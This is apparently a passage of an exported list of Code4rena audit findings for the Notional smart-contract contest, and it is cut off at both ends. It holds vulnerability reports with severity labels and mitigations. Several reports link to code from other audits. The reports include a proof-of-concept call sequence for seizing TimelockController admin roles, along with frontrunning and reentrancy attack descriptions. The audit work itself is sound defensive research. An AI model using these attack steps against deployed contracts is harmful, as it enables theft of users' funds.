"# Handle  cmichel   # Vulnerability details  ## Vulnerability Details The `enableToken` function performs an `ERC20.approve()` call but does not check the `success` return value. Some tokens do **not** revert if the approval failed but return `false` instead.  ## Impact Tokens that don't actually perform the approve and return `false` are still counted as a correct approve.  ## Recommended Mitigation Steps We recommend using [OpenZeppelin\u2019s `SafeERC20`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.1/contracts/token/ERC20/utils/SafeERC20.sol#L74) versions with the `safeApprove` function that handles the return value check as well as non-standard-compliant tokens.  "}, {"title": "Allowance checks not correctly implemented", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/66", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  defsec   # Vulnerability details  ## Impact  On the ERC20, There is a known problem named as Approve/TransferFrom race condition. On the transferFrom, allowance max check has not been added.  ## Proof of Concept  1. Navigate to the following contract.  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/InsureDAOERC20.sol#L152  ```     function transferFrom(         address sender,         address recipient,         uint256 amount     ) public virtual override returns (bool) {         uint256 currentAllowance = _allowances[sender][_msgSender()];         if (currentAllowance != type(uint256).max) {             require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");             unchecked {                 _approve(sender, _msgSender(), currentAllowance - amount);             }         }          _transfer(sender, recipient, amount);          return true;     }  ```  2. Max Allowance check has not been added into the function. ERC20 standart (Openzeppelin) is not followed.  ## Tools Used  None  ## Recommended Mitigation Steps  Consider to use openzeppelin erc20 contract. The sample transferFrom function can be seen from below.   ```     function transferFrom(         address sender,         address recipient,         uint256 amount     ) public virtual override returns (bool) {         uint256 currentAllowance = _allowances[sender][_msgSender()];         if (currentAllowance != type(uint256).max) {             require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");             unchecked {                 _approve(sender, _msgSender(), currentAllowance - amount);             }         }          _transfer(sender, recipient, amount);          return true;     } ```  https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol#L161  "}, {"title": "`nTokenAction` does not emit Approval events", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/65", "labels": ["bug", "invalid", "2 (Med Risk)", "sponsor disputed"], "target": "2021-08-notional-findings", "body": "`nTokenAction` does not emit Approval events"}, {"title": "Router calls to `nTokenAction.nTokenTransferApprove` fail", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/64", "labels": ["bug", "1 (Low Risk)", "sponsor disputed"], "target": "2021-08-notional-findings", "body": "Router calls to `nTokenAction.nTokenTransferApprove` fail"}, {"title": "Open TODOs in `ERC1155Action`", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/63", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  cmichel   # Vulnerability details  ## Vulnerability Details The `ERC1155Action._checkPostTransferEvent` has open TODOs:  ```solidity // TODO: retrieve revert string require(status, \"Call failed\"); ```  ## Impact Open TODOs can hint at programming or architectural errors that still need to be fixed.  ## Recommended Mitigation Steps Resolve the TODO and bubble up the error.  "}, {"title": "Untrusted externall call on `ERC1155Action.safeTransfer*`", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/62", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  cmichel   # Vulnerability details  ## Vulnerability Details The `ERC1155Action.safeTransferFrom` / `ERC1155Action.safeBatchTransferFrom` functions do not follow the [recommended re-entrancy protection guidelines](https://docs.soliditylang.org/en/v0.8.0/security-considerations.html#use-the-checks-effects-interactions-pattern) and allow a re-entrancy through the `onERC1155Received` while state still has to be written.  ## Impact The re-entrancy doesn't seem to open any attacks currently as the re-entrancy call happens right at the beginning and no interesting variables are set yet.  ## Recommended Mitigation Steps While no immediate re-entrancy issues could be found, it's better to add these checks, especially, as calling this function from another Notional finance function in the future might lead to unintended issues.  "}, {"title": "ERC1155Action returns `false` on `supportsInterface` with the real ERC1155 interface", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/61", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  cmichel   # Vulnerability details  ## Vulnerability Details As the return value of `ERC1155.balanceOf` was changed to a signed integer, the `nERC1155Interface` does not implement the `ERC1155` interface and the `supportsInterface` call will return false if people call it with the actual `ERC1155` interface ID.  ## Impact Not all users of the contract might care about the `balance` function and call `supportsInterface` with the original EIP1155 interface. The contract will still deny the   ## Recommended Mitigation Steps It is indeed debatable if this contract should be considered implementing ERC1155 and what the correct return value of `supportsInterface(ERC1155.interface)` should be for compatibility. Users need to be aware that this contract is not standard compliant and the `supportsInterface` call will fail.  "}, {"title": "Privilige escalation in ERC1155", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/60", "labels": ["bug", "invalid", "2 (Med Risk)", "sponsor disputed"], "target": "2021-08-notional-findings", "body": "Privilige escalation in ERC1155"}, {"title": "`initialize` functions can be frontrun", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/59", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  cmichel   # Vulnerability details  The `initialize` function that initializes important contract state can be called by anyone. See: - `ERC20VestedMine.initialize` - `AuctionPool.initialize` - all contracts that extend `Permissions`  ## Impact The attacker can initialize the contract before the legitimate deployer, hoping that the victim continues to use the same contract. In the best case for the victim, they notice it and have to redeploy their contract costing gas.  ## Recommended Mitigation Steps Use the constructor to initialize non-proxied contracts. For initializing proxy contracts deploy contracts using a factory contract that immediately calls `initialize` after deployment or make sure to call it immediately after deployment and verify the transaction succeeded.  "}, {"title": "DAO proposals can be executed by anyone due to vulnerable TimelockController", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/58", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  cmichel   # Vulnerability details  ## Vulnerability Details  The `GovernorAlpha` inherits from a vulnerable `TimelockController`. This `TimelockController` allows an `EXECUTOR` role to escalate privileges and also gain the proposer role. See details on [OZ](https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-fg47-3c2x-m2wr) and the [fix here](https://github.com/OpenZeppelin/openzeppelin-contracts/compare/v4.3.0...v4.3.1). The bug is that `_executeBatch` checks if the proposal was scheduled only **after** the transactions have been executed. This allows inserting a call into the batch that schedules the batch itself, and the entire batch will succeed. As the custom `GovernorAlpha.executeProposal` function removed the original \"queued state check\" (`require(state(proposalId) == ProposalState.Queued`), the attack can be executed by anyone, even without the `EXEUCTOR_ROLE`.  ## POC 1. Create a proposal using `propose`. The calldata will be explained in the next step. (This can be done by anyone passing the min `proposalThreshold`) 2. Call `executeProposal(proposalId, ...)` such that the following calls are made:  ``` call-0: grantRole(TIME_LOCK_ADMIN, attackerContract) call-1: grantRole(EXECUTOR, attackerContract) call-2: grantRole(PROPOSER, attackerContract) call-3: updateDelay(0) // such that _afterCall \"isOperationReady(id): timestamp[id] = block.timestamp + minDelay (0) <= block.timestamp\" passes call-4: attackerContract.hello() // this calls timelock.schedule(args=[targets, values, datas, ...]) where args were previously already stored in contract. (this is necessary because id depends on this function's args and we may not be self-referential) // attackerContract is proposer & executor now and can directly call scheduleBatch & executeBatch without having to create a proposal ```  > \u2139\ufe0f  I already talked to Jeff Wu about this and he created a test case for it confirming this finding  ## Impact Anyone who can create a proposal can become Timelock admin (proposer & executor) and execute arbitrary transactions as the DAO-controlled `GovernorAlpha`. Note that this contract has severe privileges and an attacker can now do anything that previously required approval of the DAO. For example, they could update the `globalTransferOperator` and steal all tokens.  ## Recommended Mitigation Steps We recommend updating the vulnerable contract to `TimelockController v3.4.2`. It currently uses `OpenZeppelin/openzeppelin-contracts@3.4.0-solc-0.7`   "}, {"title": "Missing parameter validation", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/57", "labels": ["bug", "duplicate", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "Missing parameter validation"}, {"title": "Total supply dependency on decimals", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/56", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact Total supply depends on the decimals. I think it makes sense to express totalSupply something like this to make it more readable and maintainable in case you will decide to change decimals:      /// @notice EIP-20 token decimals for this token     uint8 public constant decimals = 8;      /// @notice Total number of tokens in circulation (100 million NOTE)     uint256 public constant totalSupply = 10_000_0000 * 10 ** decimals;   "}, {"title": "Wrong order in Approval event", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/55", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact function transferFrom in nTokenERC20Proxy emits Approval event:   emit Approval(msg.sender, from, newAllowance); The order of the parameters is wrong, 'msg.sender' and 'from' should be in the opposite order. This may confuse frontends or other services that consume these events from the outside.  ## Recommended Mitigation Steps   emit Approval(from, msg.sender, newAllowance);  "}, {"title": "Cache values that are accessed more than once", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/54", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-08-notional-findings", "body": "Cache values that are accessed more than once"}, {"title": "uint is always >= 0", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/53", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  Jujic   # Vulnerability details  ## Impact The uint   `percentBacked ` can not  be negative.  ## Proof of Concept https://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/PriceCurves/ThreePieceWiseLinearPriceCurve.sol#L131 ``` uint256 percentBacked = _collateralVCBalance.mul(1e18).div(_totalVCBalance); require(percentBacked <= 1e18 && percentBacked >= 0, \"percent backed out of bounds\"); ```  ## Tools Used Remix  ## Recommended Mitigation Steps You should remove the `percentBacked >= 0` from require to save some gas.  "}, {"title": "Unused variables", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/52", "labels": ["bug", "G (Gas Optimization)", "sponsor disputed"], "target": "2021-08-notional-findings", "body": "Unused variables"}, {"title": "lack of zero address validation in constructor", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/51", "labels": ["bug", "duplicate", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "lack of zero address validation in constructor"}, {"title": "lack of require message", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/50", "labels": ["bug", "0 (Non-critical)", "sponsor disputed"], "target": "2021-08-notional-findings", "body": "# Handle  JMukesh   # Vulnerability details  ## Impact require message give the idea what was the cause of failure , so its the best practise to  add message in require()  ## Proof of Concept https://github.com/code-423n4/2021-10-ambire/blob/bc01af4df3f70d1629c4e22a72c19e6a814db70d/contracts/wallet/Zapper.sol#L218  ## Tools Used manual reveiw  ## Recommended Mitigation Steps add message in require()  "}, {"title": "transferOwnership should be two step process", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/49", "labels": ["bug", "duplicate", "1 (Low Risk)"], "target": "2021-08-notional-findings", "body": "transferOwnership should be two step process"}, {"title": "NotionalV1ToNotionalV2 should reject ETH transfers from others than WETH", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/48", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact contract NotionalV1ToNotionalV2 has an empty receive function which allows it to receive Ether. I suppose this was needed to receive ETH when withdrawing from WETH. As there is no way to send out accidentally sent ETH from this contract, I suggest adding an auth check to this receive function to only accept ETH from WETH contract.  ## Recommended Mitigation Steps require(msg.sender == address(WETH), \"Not WETH\");  "}, {"title": "Check if address is a contract", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/47", "labels": ["bug", "duplicate", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact There are several places that check if the address is a contract or not, e.g.:     uint256 codeSize;     assembly {         codeSize := extcodesize(operator)     }     // Sanity check to ensure that operator is a contract, not an EOA     require(codeSize > 0, \"Operator must be a contract\"); First of all, I want you to be aware that this check can be easily bypassed. A contract does not have source code available during construction. This means that while the constructor is running, it can make calls to other contracts, but extcodesize for its address returns zero. In your case, currently, I do not see a real problem with that as you only use it as an additional check (no critical functionality) but I have a suggestion for you to extract this check to a separate library to make it more maintainable or use a library from OpenZeppelin that exposes this function: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol#L26   "}, {"title": "notionalCallback returns no value", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/46", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact function notionalCallback (in NotionalV1ToNotionalV2 and CompoundToNotionalV2) declares to return uint, however, no actual value is returned.   ## Recommended Mitigation Steps Either remove the return declaration or return the intended value (I assume it may return a value that it gets from depositUnderlyingToken/depositAssetToken). Otherwise, it may confuse other protocols that later may want to integrate with you.  "}, {"title": "notionalCallback can be tricked by anyone", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/45", "labels": ["bug", "duplicate", "3 (High Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact Anyone can call function notionalCallback with arbitrary params and pass the auth check. The only auth check can be easily bypassed by setting sender param to the address of this contract. It allows to choose any parameter that I want:     function notionalCallback(         address sender,         address account,         bytes calldata callbackData     ) external returns (uint256) {         require(sender == address(this), \"Unauthorized callback\");  ## Recommended Mitigation Steps It needs to check that msg.sender is Notional.  "}, {"title": "Address.isContract with no check of returned value", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/44", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact function activateNotional calls Address.isContract(...) but does not check the returned value, thus making this call pretty much useless:   Address.isContract(address(notionalProxy_));  ## Recommended Mitigation Steps Wrap this in a require statement.  "}, {"title": "lack of input validation of arrays", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/43", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  JMukesh   # Vulnerability details  ## Impact function migrateBorrowFromCompound(         address cTokenBorrow,         uint256 cTokenRepayAmount,         uint16[] memory notionalV2CollateralIds,         uint256[] memory notionalV2CollateralAmounts,         BalanceActionWithTrades[] calldata borrowAction     ) ;  if the  array length of notionalV2CollateralId ,  notionalV2CollateralAmounts and  borrowAction is not equal it can lead to an error  ## Proof of Concept  https://github.com/code-423n4/2021-08-notional/blob/4b51b0de2b448e4d36809781c097c7bc373312e9/contracts/external/adapters/CompoundToNotionalV2.sol#L24   ## Tools Used  manual review  ## Recommended Mitigation Steps check the input array length  "}, {"title": "initialize()   function of router.sol can be reinitialize", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/42", "labels": ["bug", "0 (Non-critical)", "sponsor disputed"], "target": "2021-08-notional-findings", "body": "initialize()   function of router.sol can be reinitialize"}, {"title": "unchecked return value from isContract()", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/41", "labels": ["bug", "duplicate", "1 (Low Risk)", "disagree with severity"], "target": "2021-08-notional-findings", "body": "unchecked return value from isContract()"}, {"title": "use of floating pragma", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/40", "labels": ["bug", "duplicate", "0 (Non-critical)"], "target": "2021-08-notional-findings", "body": "# Handle  JMukesh   # Vulnerability details  ## Impact Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.  ## Proof of Concept most of the contract use floating pragma  ## Tools Used manual review  ## Recommended Mitigation Steps use fixed pragma  "}, {"title": "Insufficient validation of rate value", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/39", "labels": ["bug", "duplicate", "2 (Med Risk)"], "target": "2021-08-notional-findings", "body": "Insufficient validation of rate value"}, {"title": "Use of transfer() instead of call() to send eth", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/38", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2021-08-notional-findings", "body": "Use of transfer() instead of call() to send eth"}, {"title": "Erc20 Race condition", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/37", "labels": ["bug", "0 (Non-critical)", "disagree with severity", "sponsor acknowledged"], "target": "2021-08-notional-findings", "body": "Erc20 Race condition"}, {"title": " Incorrect   event   parameters   in    transferFrom    function  ", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/36", "labels": ["bug", "duplicate", "1 (Low Risk)", "disagree with severity"], "target": "2021-08-notional-findings", "body": " Incorrect   event   parameters   in    transferFrom    function  "}, {"title": "proposal get defeated even if forVotes == againstVotes in GovernorAlpha.sol", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/35", "labels": ["bug", "0 (Non-critical)", "disagree with severity", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  JMukesh   # Vulnerability details  ## Impact proposal get defeated even if forVotes == againstVotes during the voting which impact the given proposals. Instead of this condition forVotes <= againstVotes, it should be  forVotes < againstVotes  ## Proof of Concept  https://github.com/code-423n4/2021-08-notional/blob/4b51b0de2b448e4d36809781c097c7bc373312e9/contracts/external/governance/GovernorAlpha.sol#L389  ## Tools Used manual review  ## Recommended Mitigation Steps change the condition for determining the states  "}, {"title": "SHOULD CHECK RETURN DATA FROM CHAINLINK AGGREGATORS", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/34", "labels": ["bug", "duplicate", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  defsec   # Vulnerability details  ## Impact  The latestRoundData function in the contract PriceFeed.sol fetches the asset price from a Chainlink aggregator using the latestRoundData function. However, there are no checks on roundID.  Stale prices could put funds at risk. According to Chainlink's documentation, This function does not error if no answer has been reached but returns 0, causing an incorrect price fed to the PriceOracle. The external Chainlink oracle, which provides index price information to the system, introduces risk inherent to any dependency on third-party data sources. For example, the oracle could fall behind or otherwise fail to be maintained, resulting in outdated data being fed to the index price calculations of the liquidity.  Example Medium Issue : https://github.com/code-423n4/2021-08-notional-findings/issues/18  ## Proof of Concept  1. Navigate to the following contract.  \"https://github.com/code-423n4/2021-12-yetifinance/blob/1da782328ce4067f9654c3594a34014b0329130a/packages/contracts/contracts/PriceFeed.sol#L578\"  2. Only the following checks are implemented.  ```         if (!_response.success) {return true;}         // Check for an invalid roundId that is 0         if (_response.roundId == 0) {return true;}         // Check for an invalid timeStamp that is 0, or in the future         if (_response.timestamp == 0 || _response.timestamp > block.timestamp) {return true;}         // Check for non-positive price         if (_response.answer <= 0) {return true;}   ```  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Consider to add checks on the return data with proper revert messages if the price is stale or the round is incomplete, for example:  ``` (uint80 roundID, int256 price, , uint256 timeStamp, uint80 answeredInRound) = ETH_CHAINLINK.latestRoundData(); require(price > 0, \"Chainlink price <= 0\");  require(answeredInRound >= roundID, \"...\"); require(timeStamp != 0, \"...\"); ```  "}, {"title": "proRataYears is sometimes 0.", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/33", "labels": ["bug", "invalid", "2 (Med Risk)", "sponsor disputed"], "target": "2021-08-notional-findings", "body": "proRataYears is sometimes 0."}, {"title": "Settle Portfolio state could be griefed.", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/32", "labels": ["bug", "invalid", "2 (Med Risk)", "sponsor disputed"], "target": "2021-08-notional-findings", "body": "Settle Portfolio state could be griefed."}, {"title": "Consider using a solidity version >= 0.8.0", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/31", "labels": ["bug", "invalid", "2 (Med Risk)", "sponsor disputed"], "target": "2021-08-notional-findings", "body": "Consider using a solidity version >= 0.8.0"}, {"title": "Some TradingActions do not have frontrunning protections", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/30", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2021-08-notional-findings", "body": "Some TradingActions do not have frontrunning protections"}, {"title": "No checks on target variable", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/29", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  tensors   # Vulnerability details  ## Impact Lack of checks on target could lead to loss of funds.  ## Proof of Concept https://github.com/code-423n4/2021-08-notional/blob/4b51b0de2b448e4d36809781c097c7bc373312e9/contracts/external/governance/Reservoir.sol#L50  ## Recommended Mitigation Steps Require that target is non-zero.  "}, {"title": "batchBalanceAction could make multiple deposits with the same msg.value?", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/28", "labels": ["bug", "duplicate", "0 (Non-critical)", "sponsor disputed"], "target": "2021-08-notional-findings", "body": "batchBalanceAction could make multiple deposits with the same msg.value?"}, {"title": "Recommend adding a nonReentrant modifier to external functions", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/27", "labels": ["bug", "0 (Non-critical)", "disagree with severity", "sponsor disputed"], "target": "2021-08-notional-findings", "body": "Recommend adding a nonReentrant modifier to external functions"}, {"title": "Add buffer, haircut and liquidation discount checks.", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/26", "labels": ["bug", "invalid", "1 (Low Risk)", "sponsor disputed"], "target": "2021-08-notional-findings", "body": "Add buffer, haircut and liquidation discount checks."}, {"title": "ERC1155 has reentrancy possibilities.", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/25", "labels": ["bug", "duplicate", "1 (Low Risk)", "disagree with severity"], "target": "2021-08-notional-findings", "body": "ERC1155 has reentrancy possibilities."}, {"title": "Can't call external functions internally ", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/24", "labels": ["bug", "invalid", "3 (High Risk)", "sponsor disputed"], "target": "2021-08-notional-findings", "body": "Can't call external functions internally "}, {"title": "Gas savings: variables can all be a multiple of each other", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/23", "labels": ["bug", "invalid", "G (Gas Optimization)", "sponsor disputed"], "target": "2021-08-notional-findings", "body": "Gas savings: variables can all be a multiple of each other"}, {"title": "Idiosyncratic fCash valuation is incorrect", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/22", "labels": ["bug", "invalid", "3 (High Risk)", "sponsor disputed"], "target": "2021-08-notional-findings", "body": "Idiosyncratic fCash valuation is incorrect"}, {"title": "Can a small order change the lastImpliedRate significantly?", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/21", "labels": ["bug", "invalid", "3 (High Risk)", "sponsor disputed"], "target": "2021-08-notional-findings", "body": "Can a small order change the lastImpliedRate significantly?"}, {"title": "Attackers can force liquidations by borrowing large amounts of an asset.", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/20", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2021-08-notional-findings", "body": "Attackers can force liquidations by borrowing large amounts of an asset."}, {"title": "Time window must be chosen carefully", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/19", "labels": ["bug", "invalid", "2 (Med Risk)", "sponsor disputed"], "target": "2021-08-notional-findings", "body": "Time window must be chosen carefully"}, {"title": ".latestRoundData() does not update the oracle - ExchangeRate.sol", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/18", "labels": ["bug", "duplicate", "2 (Med Risk)"], "target": "2021-08-notional-findings", "body": ".latestRoundData() does not update the oracle - ExchangeRate.sol"}, {"title": "Consider deploying on a sidechain or an L2?", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/16", "labels": ["bug", "invalid", "G (Gas Optimization)", "sponsor disputed"], "target": "2021-08-notional-findings", "body": "Consider deploying on a sidechain or an L2?"}, {"title": "TokenHandler.sol, L174 - .transfer is bad practice", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/15", "labels": ["bug", "duplicate", "2 (Med Risk)"], "target": "2021-08-notional-findings", "body": "TokenHandler.sol, L174 - .transfer is bad practice"}, {"title": "Possible reentrancy in balanceOf, decimals, mint", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/14", "labels": ["bug", "duplicate", "invalid", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  tensors   # Vulnerability details  ## Impact Registering tokens that aren't properly vetted can lead to a loss of funds if the token has callbacks.  CREAM finance got hacked in a similar way because the ampleforth token had a callback in the transfer method that wasn't noticed when they vetted it.   ## Proof of Concept For example, the redeem function is vulnerable to such a reentrancy in the balanceOf method, since address balances aren't updated before the token call.  https://github.com/code-423n4/2021-08-notional/blob/4b51b0de2b448e4d36809781c097c7bc373312e9/contracts/internal/balances/TokenHandler.sol#L131   ## Recommended Mitigation Steps Either: - Add nonreentrant modifiers - Update all storage variables before making outside calls with the token - Put steps in place for devs to properly vet tokens.  "}, {"title": "Gas optimization: Can put require and variable declaration inside the if statement.", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/13", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-08-notional-findings", "body": "Gas optimization: Can put require and variable declaration inside the if statement."}, {"title": "Flipped boolean or confusing notation on TokenHandler.sol", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/12", "labels": ["bug", "invalid", "1 (Low Risk)", "sponsor disputed"], "target": "2021-08-notional-findings", "body": "Flipped boolean or confusing notation on TokenHandler.sol"}, {"title": "Can initiate the same token multiple times with different currency IDs", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/11", "labels": ["bug", "invalid", "1 (Low Risk)", "sponsor disputed"], "target": "2021-08-notional-findings", "body": "Can initiate the same token multiple times with different currency IDs"}, {"title": "Reentrancy Bug in `TimelockController.sol`", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/10", "labels": ["bug", "duplicate", "3 (High Risk)"], "target": "2021-08-notional-findings", "body": "Reentrancy Bug in `TimelockController.sol`"}, {"title": "Gas optimization on _INT256_MIN ", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/9", "labels": ["bug", "G (Gas Optimization)", "sponsor disputed"], "target": "2021-08-notional-findings", "body": "Gas optimization on _INT256_MIN "}, {"title": "unsafe cast from int to uint can lead to incentive abuse", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/8", "labels": ["bug", "0 (Non-critical)", "sponsor disputed"], "target": "2021-08-notional-findings", "body": "unsafe cast from int to uint can lead to incentive abuse"}, {"title": "DOS by Frontrunning NoteERC20 `initialize()` Function", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/7", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  leastwood   # Vulnerability details  ## Impact  The `scripts/` folder outlines a number of deployment scripts used by the Notional team. Some of the contracts deployed utilise the ERC1967 upgradeable proxy standard. This standard involves first deploying an implementation contract and later a proxy contract which uses the implementation contract as its logic. When users make calls to the proxy contract, the proxy contract will delegate call to the underlying implementation contract. `NoteERC20.sol` and `Router.sol` both implement an `initialize()` function which aims to replace the role of the `constructor()` when deploying proxy contracts. It is important that these proxy contracts are deployed and initialized in the same transaction to avoid any malicious frontrunning. However, `scripts/deployment.py` does not follow this pattern when deploying `NoteERC20.sol`'s proxy contract. As a result, a malicious attacker could monitor the Ethereum blockchain for bytecode that matches the `NoteERC20` contract and frontrun the `initialize()` transaction to gain ownership of the contract. This can be repeated as a Denial Of Service (DOS) type of attack, effectively preventing Notional's contract deployment, leading to unrecoverable gas expenses.  ## Proof of Concept  https://github.com/code-423n4/2021-08-notional/blob/main/scripts/deployment.py#L44-L60 https://github.com/code-423n4/2021-08-notional/blob/main/scripts/mainnet/deploy_governance.py#L71-L105  ## Tools Used  Manual code review  ## Recommended Mitigation Steps  As the `GovernanceAlpha.sol` and `NoteERC20.sol` are co-dependent contracts in terms of deployment, it won't be possible to deploy the governance contract before deploying and initializing the token contract. Therefore, it would be worthwhile to ensure the `NoteERC20.sol` proxy contract is deployed and initialized in the same transaction, or ensure the `initialize()` function is callable only by the deployer of the `NoteERC20.sol` contract. This could be set in the proxy contracts `constructor()`.   "}, {"title": "_transfer what happens if sender==recipient", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/6", "labels": ["bug", "duplicate", "3 (High Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact The function _transfer of nTokenAction.sol uses temporary variables and updates the sender and recipient separately. This is a dangerous constructions because the update of the recipient could overwrite the update of the sender. This has led to several hacks at other comparable contracts  ## Proof of Concept https://github.com/code-423n4/2021-08-notional/blob/main/contracts/external/actions/nTokenAction.sol ```JS  function _transfer(uint256 currencyId,address sender,address recipient, uint256 amount) internal returns (bool) {        ...           senderBalance.netNTokenTransfer = amountInt.neg();         recipientBalance.netNTokenTransfer = amountInt;          senderBalance.finalize(sender, senderContext, false);         recipientBalance.finalize(recipient, recipientContext, false);         senderContext.setAccountContext(sender);         recipientContext.setAccountContext(recipient); ... ```  ## Tools Used  ## Recommended Mitigation Steps Double check what happens when sender==recipient  Add checks to make sure (sender!=recipient) because that usually isn't useful anyway.   "}, {"title": "Use pragma 